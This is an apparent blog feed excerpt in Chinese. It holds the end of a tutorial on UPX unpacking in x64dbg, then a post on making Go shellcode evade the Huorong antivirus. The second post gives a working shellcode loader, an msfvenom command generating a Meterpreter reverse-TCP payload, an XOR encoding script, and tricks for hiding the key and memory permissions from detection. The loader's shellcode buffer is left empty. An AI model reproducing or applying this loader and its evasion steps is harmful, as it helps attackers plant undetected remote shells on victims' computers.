			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134122450_hu10678774893314130376.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134122450_hu14979182918841928929.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-脱壳&#34;&gt;5. 脱壳
&lt;/h1&gt;&lt;h2 id=&#34;51-直接脱壳&#34;&gt;5.1 直接脱壳
&lt;/h2&gt;&lt;p&gt;如果能直接识别到UPX壳的话，直接使用UPX -d 进行脱壳如下&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 431; 
			flex-basis: 1036px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134443589.png&#34; data-size=&#34;1041x241&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134443589.png&#34;
			width=&#34;1041&#34;
			height=&#34;241&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134443589_hu1847525015121275268.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134443589_hu1239597582657054021.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;52-手动脱壳x64dbg&#34;&gt;5.2 手动脱壳(x64dbg)
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;脱壳基本步骤：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;寻找 OEP&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;转储&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;修复 IAT（修复导入表）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;检查目标程序是否存在 AntiDump 等组织程序被转储的保护措施，并尝试修复这些问题。&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;寻找OEP：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;单步跟踪法：主要使用 “F8” 和 “F4” 这两个快捷键，一步一步分析每一条汇编背后所代表的意思，将壳代码读懂，从而找到原始 OEP 然后脱壳。&lt;/li&gt;
&lt;li&gt;ESP定律法：一般加壳程序在运行时，会先执行壳代码，然后在内存中恢复还原原程序，再跳转到原始OEP，执行原程序的代码。这些壳代码首先会使用 PUSHAD 指令保存寄存器环境，在解密各个区段完毕，跳往 OEP 之前会使用 POPAD 指令恢复寄存器环境。&lt;/li&gt;
&lt;li&gt;内存镜像法：在加壳程序执行时，会先将源程序的 “CODE” 和 “DATA” 区段解压\解密并载入内存，然后再载入 “rsrc” 资源到内存中，最后跳到 OEP 执行解密后的程序。内存镜像法就是在 rsrs 先设置一个内存执行断点，当程序停下来的时候说明程序已经解压\解密完成。此时再到 “DATA” 区段设置内存执行断点，程序下一次会停在 OEP 入口点。&lt;/li&gt;
&lt;li&gt;一步到达OEP（😀.jpg）：使用快捷键 “Ctrl+B” 搜索十六进制字符串 “E9 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00”，即可找到跳转 OEP 的位置；使用快捷键 “Ctrl+F” 搜索 popad。找的 popad 需要满足，在程序返回时，壳程序希望恢复现场环境的地方。也就是靠近 jmp 和 return 的地方。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;521-esp定律&#34;&gt;5.2.1 ESP定律
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;F9，运行到pushad指令，F7执行到下一行汇编指令，此时寄存器的值存储到栈顶，也就是 esp 的位置。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 193; 
			flex-basis: 464px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140418859.png&#34; data-size=&#34;2556x1322&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140418859.png&#34;
			width=&#34;2556&#34;
			height=&#34;1322&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140418859_hu18371772899292707688.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140418859_hu3081928968583268781.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;右击 esp 寄存器，选择在内存中跳转。此时才内存窗口可以看到当前存储的寄存器值，并如图设置硬件访问断点。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 186; 
			flex-basis: 447px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140535281.png&#34; data-size=&#34;2558x1373&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140535281.png&#34;
			width=&#34;2558&#34;
			height=&#34;1373&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140535281_hu8192906993186461438.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140535281_hu14507023427029792207.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;“F9” 运行程序后，程序断在如下位置。下面有个 jmp 指令，跳转到 OEP 处。OEP地址为：0x00409CAD&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 186; 
			flex-basis: 447px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140741060.png&#34; data-size=&#34;2556x1371&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140741060.png&#34;
			width=&#34;2556&#34;
			height=&#34;1371&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140741060_hu8362997799888596031.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628140741060_hu128348868784203625.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;522-内存镜像法&#34;&gt;5.2.2 内存镜像法
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;载入 UPX 程序，使用快捷键 “Alt+M” 进入到内存视图，对 “.rsrc” 区段设置内存访问断点&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 444px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142041239.png&#34; data-size=&#34;2557x1380&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142041239.png&#34;
			width=&#34;2557&#34;
			height=&#34;1380&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142041239_hu16334476667518539202.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142041239_hu16381686801701929950.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;“F9” 运行upx程序到 “rsrc” 区段，此时前面两个区段已经解密好了。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 446px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142124546.png&#34; data-size=&#34;2560x1377&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142124546.png&#34;
			width=&#34;2560&#34;
			height=&#34;1377&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142124546_hu12032007515512591565.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142124546_hu8140839394873503015.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;再次到内存视图，使用 “F2” 对 “CODE” 区段设置内存执行断点。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 445px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142207624.png&#34; data-size=&#34;2560x1379&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142207624.png&#34;
			width=&#34;2560&#34;
			height=&#34;1379&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142207624_hu9810044325371938091.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142207624_hu11240202325385432193.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;继续 “F9” 执行代码，此时可以看到程序停在了 OEP 入口处（0x00409E23）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 445px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142604392.png&#34; data-size=&#34;2560x1378&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142604392.png&#34;
			width=&#34;2560&#34;
			height=&#34;1378&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142604392_hu15711857234930093310.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142604392_hu4026674609122015220.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;6-修复iat表&#34;&gt;6. 修复IAT表
&lt;/h1&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 86; 
			flex-basis: 206px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142721637.png&#34; data-size=&#34;678x787&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142721637.png&#34;
			width=&#34;678&#34;
			height=&#34;787&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142721637_hu5693294612690678288.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142721637_hu15046219043055967705.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置OEP地址-&amp;gt; IAT Autosearch -&amp;gt; Get Imports -&amp;gt; Dump -&amp;gt; Fix Dump&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 723; 
			flex-basis: 1737px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142851944.png&#34; data-size=&#34;883x122&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142851944.png&#34;
			width=&#34;883&#34;
			height=&#34;122&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142851944_hu13374587704180570463.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142851944_hu10149744396245832797.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 127; 
			flex-basis: 306px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628143014197.png&#34; data-size=&#34;1419x1111&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628143014197.png&#34;
			width=&#34;1419&#34;
			height=&#34;1111&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628143014197_hu7434757141217660380.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628143014197_hu7035804935062864507.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Go语言ShellCode免杀火绒</title>
        <link>https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</link>
        <pubDate>Mon, 03 Jun 2024 16:22:34 +0800</pubDate>
        
        <guid>https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</guid>
        <description>&lt;img src="https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164.png" alt="Featured image of post Go语言ShellCode免杀火绒" /&gt;&lt;h1 id=&#34;1--shellcode-加载器go&#34;&gt;1.  Shellcode 加载器（go）
&lt;/h1&gt;&lt;p&gt;我们先看最后的免杀代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import (
	&amp;quot;fmt&amp;quot;
	&amp;quot;os&amp;quot;
	&amp;quot;syscall&amp;quot;
	&amp;quot;unsafe&amp;quot;
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.NewLazyDLL(&amp;quot;kernel32.dll&amp;quot;)
	ntdll         = syscall.NewLazyDLL(&amp;quot;ntdll.dll&amp;quot;)
	VirtualAlloc  = kernel32.NewProc(&amp;quot;VirtualAlloc&amp;quot;)
	RtlCopyMemory = ntdll.NewProc(&amp;quot;RtlCopyMemory&amp;quot;)
	//shellcode_buf = []byte{
	//}
	shellcode_buf = []byte{
	}
)

func check(e error) {
	if e != nil {
		if e.Error() != &amp;quot;The operation completed successfully.&amp;quot; { // 内存错误
			fmt.Println(e.Error())
			os.Exit(1)
		}
	}
}

func main() {
	//// xor
	homeDir, _ := os.UserHomeDir()
	xor := homeDir[3] // U -&amp;gt; 85
	decimalValue := int(xor)
	shellcode := xorEncrypt(shellcode_buf, decimalValue)
	//shellcode := shellcode_buf

	fmt.Println(shellcode)
	// 申请内存
	// MEM_COMMIT|MEM_RESERVE
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		check(err)
	}
	// 写入shellcode
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;amp;shellcode[0])), uintptr(len(shellcode)))
	check(err)

	// 执行shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func xorEncrypt(buf []byte, value int) []byte {
	for i := 0; i &amp;lt; len(buf); i++ {
		buf[i] ^= byte(value)
	}
	return buf
}

// go build -ldflags=&amp;quot;-H windowsgui -w -s&amp;quot; shellcodeLoader.go

&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;2-shellcode-生成&#34;&gt;2. shellcode 生成
&lt;/h1&gt;&lt;p&gt;对于shellcode的生成我们采用msf进行生成：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx -f c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于生成的shellcode，我们如果不进行处理，对于火绒这类的杀毒软件来说，做简单的静态分析，如果坚持到0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50···这些关键字节，肯定会报毒：Backdoor/W64.Meterpreter.f&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 314; 
			flex-basis: 754px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34; data-size=&#34;761x242&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34;
			width=&#34;761&#34;
			height=&#34;242&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu13638370721843017092.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu2798833134595910052.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;3可能的绕过方式&#34;&gt;3.可能的绕过方式
&lt;/h1&gt;&lt;p&gt;一般来说，为了防止shellcode被检测到，我们通过对shellcode进行处理，如base64加密，亦或等等操作，也可以考虑github的sgn工具。&lt;/p&gt;
&lt;p&gt;本文我们主要采用亦或操作（xor）&lt;/p&gt;
&lt;p&gt;我们先将msf生成的shellcode进行亦或操作：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# xor.py 
shellcode = []

# xor 85
shellcode1 = &#39;&#39;.join([&#39;\\x%02x&#39; % i for i in shellcode])
print(shellcode1)
for i in range(len(shellcode)):
    shellcode[i] ^= 85

# 0x格式化输出
shellcode = &#39;&#39;.join([&#39;\\x%02x&#39; % i for i in shellcode])
print(shellcode)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 615; 
			flex-basis: 1478px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537.png&#34; data-size=&#34;2476x402&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537.png&#34;
			width=&#34;2476&#34;
			height=&#34;402&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537_hu5249771822563492932.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537_hu5910632486674011798.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;再将shellcode进行替换，并且与目标值进行亦或，就可以获得正确的shellcode。&lt;/p&gt;
&lt;p&gt;但是当我们进行编译的时候，任然报毒。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 314; 
			flex-basis: 754px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34; data-size=&#34;761x242&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34;
			width=&#34;761&#34;
			height=&#34;242&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu13638370721843017092.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu2798833134595910052.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;
shellcode := xorEncrypt(shellcode_buf, 85)

func xorEncrypt(buf []byte, value int) []byte {
	for i := 0; i &amp;lt; len(buf); i++ {
		buf[i] ^= byte(value)
	}
	return buf
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这是由于火绒在检测的时候如果能明确看到85，会尝试亦或来还原shellcode，base64同理。&lt;/p&gt;
&lt;p&gt;所以我们就尝试如果隐藏85，通过读取用户目录来获取。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;
	homeDir, _ := os.UserHomeDir()
	xor := homeDir[3] // U -&amp;gt; 85
	decimalValue := int(xor)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时，shellcode是没有问题的，但是在进行编译的时候会遇到内存的报毒：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 309; 
			flex-basis: 741px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696.png&#34; data-size=&#34;776x251&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696.png&#34;
			width=&#34;776&#34;
			height=&#34;251&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696_hu11939858661195890870.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696_hu17901365803499758145.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这个原因是我们在申请内存时，设置内存权限为MEM_COMMIT|MEM_RESERVE；&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 254; 
			flex-basis: 611px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430.png&#34; data-size=&#34;1100x432&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430.png&#34;
			width=&#34;1100&#34;
			height=&#34;432&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430_hu7069117773989795382.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430_hu4159307438650186210.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 529; 
			flex-basis: 1270px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028.png&#34; data-size=&#34;1631x308&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028.png&#34;
			width=&#34;1631&#34;
			height=&#34;308&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028_hu4740495117857859404.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028_hu18383027260707193865.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我们将内存权限设置为MEM_COMMIT就可以了。&lt;/p&gt;
&lt;h1 id=&#34;4-免杀效果&#34;&gt;4. 免杀效果
&lt;/h1&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 166; 
			flex-basis: 398px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345.png&#34; data-size=&#34;1023x616&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345.png&#34;
			width=&#34;1023&#34;
			height=&#34;616&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345_hu11057556029165390164.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345_hu7884649830339844576.png 1024w&#34;
			loading=&#34;lazy&#34;
